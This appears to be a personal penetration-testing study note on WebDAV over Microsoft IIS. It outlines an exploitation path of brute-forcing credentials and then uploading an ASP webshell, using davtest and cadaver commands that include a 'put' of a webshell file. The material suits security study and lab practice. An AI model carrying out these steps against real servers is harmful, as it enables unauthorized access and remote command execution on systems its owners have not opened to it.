---
title: WebDAV
description: >-
  Web-based Distributed authoring and versioning Sets if extensions to the HTTP
  protocol which allow users to collaboratively edit and manage files in remote…
date: '2026-10-26'
topics:
  - systems
section:
  - Systems
  - Window
  - Windows Services
order: 91
---
- Web-based Distributed authoring and versioning
- Sets if extensions to the HTTP protocol which allow users to collaboratively edit and manage files in remote web servers.
- Enables web server to function as a file server for collaborative authoring
- Runs on top of [Microsoft IIS](/notes/microsoft-iis/) on port 80 / 443
- Have Auth (Username, Password)


## Exploitation

1. Check whether WebDAV has been configured to run on the IIS web server
2. Perform brute-force on WebDAV server 
3. After Auth, upload malicious `.asp` payload to execute arbitrary commands or obtain a reverse shell on the target

### Tools
#### 1. davtest

- used to scan, authenticate and exploit WebDAV server
- See which files can be uploaded
- Which files extension can be execute


```bash
davtest -url http://IP_ADDRESS/webdav
```

```bash
davtest -auth USERNAME:PASSWORD -url http://IP_ADDRESS/webdav
```


#### 2. cadaver

- Supports file upload, download, on-screen display, in place editing, namespace operations (move/copy), collection creation and deletion, property manipulation and resources locking on WebDAV servers


```bash
cadaver http://IP_ADDRESS/webdav
```
Then it will ask for auth, give username and password

***Webshells***
```bash
put /usr/share/webshells/asp/webshell.asp
```
